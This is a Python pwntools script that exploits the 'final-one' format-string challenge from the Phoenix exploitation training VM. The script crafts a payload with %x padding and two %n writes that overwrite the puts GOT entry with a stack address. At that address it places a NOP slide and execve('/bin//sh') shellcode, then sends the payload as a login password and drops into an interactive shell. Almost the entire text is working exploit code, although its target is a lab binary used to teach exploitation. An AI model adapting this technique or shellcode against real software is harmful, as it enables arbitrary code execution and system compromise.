from pwn import *

arch = "i486"


def to_bytes(s):
    return bytes(s, "utf-8")


final_string = "[final1] $ "
# found adr via gdb
buf_adr = pack(0xffffce70, 32)
buf_adr_lower = 0xce70
buf_adr_upper = 0xffff

puts_got_entry_adr = pack(0x8049e48, 32)
puts_got_entry_upper_adr = pack(0x8049e48+0x2, 32)

nop_slide = b"\x90"*3
shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
username = b"AAAA"

# we need 15 %x to reach the buffer
# index = 15 points onto word after B's


payload = b""
payload += b"B"*2
payload += puts_got_entry_adr
payload += b"D"*4
payload += puts_got_entry_upper_adr
# 36 bytes nop slide + payload
payload += nop_slide
payload += shellcode

# reach and skip B's in buffer
payload += 14 * b"%x "

# FIRST WRITE
# 200 is magic offset found by trial & error
# should be # prior bytes
offset = buf_adr_lower - 200
print("offset1: " + str(offset))
# write lower bytes
payload += b"%"+to_bytes(str(offset))+b"x"
payload += b"%n"


# SECOND WRITE
# offset should be prior bytes + padding
# 200 is magic offset found by trial & error
# %n turns to null in result string, so it does not change padding values
offset = buf_adr_upper - offset - 200
print("offset2: " + str(offset))
payload += b"%"+to_bytes(str(offset))+b"x"
payload += b"%n"
payload += b"A"

print("payload len: " + str(len(payload)))
# write("/tmp/docgil", payload)

io = process(["/opt/phoenix/" + arch + "/"+"final-one", "--test"], stderr=STDOUT)

# banner
print(io.recvline())
# "final $"
print(io.recvn(numb=len(final_string)))
io.sendline(b"username " + username)
# "final $"
print(io.recvn(numb=len(final_string)))
# uncomment for hook point for gdb
# io.interactive()
# payload as password
print(io.sendline(b"login " + payload))
# fprintf
print(io.recvline())
# "login failed" should not be printed anymore bc function not called
# print(io.recvline())
io.interactive()
